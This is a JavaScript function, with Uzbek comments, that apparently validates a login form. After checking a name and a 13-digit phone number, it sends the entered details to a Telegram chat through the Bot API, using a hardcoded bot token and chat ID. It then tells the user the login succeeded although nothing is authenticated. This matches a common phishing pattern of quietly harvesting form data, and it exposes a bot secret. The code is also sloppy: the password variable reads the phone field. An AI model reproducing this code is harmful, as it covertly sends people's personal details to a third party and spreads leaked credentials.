

function validateLogin() {
    var username = document.getElementById('username').value;
    var password = document.getElementById('tel').value;
    var phoneNumber = document.getElementById('tel').value;

    // Ismni tekshirish (faqat imloviy belgilar va raqamlar)
    var nameRegex = /^[a-zA-Z0-9]+$/;
    if (!nameRegex.test(username)) {
        alert('Ism faqat imloviy belgilar va raqamlardan iborat bo\'lishi kerak');
        return;
    }

    // Telefon raqamni tekshirish (faqat 13 honalik raqam)
    var phoneRegex = /^\d{13}$/;
    if (!phoneRegex.test(phoneNumber)) {
        alert('Telefon raqamini noto\'g\'ri kiritdingiz. Telefon raqami faqat 13 honalik bo\'lishi kerak');
        return;
    }

    // Sizning login validatsiyangizni qo'shishingiz mumkin
    // Masalan, ism va raqamning to'liq to'ldirilganligini tekshirish
    if (username === '' || password === '') {
        alert('Ism va raqamni to\'liq kiriting');
    } else {
        // Bot token va chat ID ni quyidagi o'zgartiring
        const botToken = '6630040587:AAFfkaq6lBrXShzWD9uwVMcjaxPh0eUM-No';
        const chatId = '2043384301';

        // Xabar tayyorlash
        const message = `Ism: ${username}\nRaqam: ${phoneNumber}`;

        // Telegramga xabar yuborish uchun URL
        const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        // Fetch orqali Telegramga xabar yuborish
        fetch(apiUrl)
            .then(response => response.json())
            .then(data => {
                // Serverdan kelgan javobni ishlash
                console.log(data);
            })
            .catch(error => {
                console.error('Xato yuz berdi:', error);
            });

        alert('Kirish muvaffaqiyatli amalga oshirildi');
    }
}
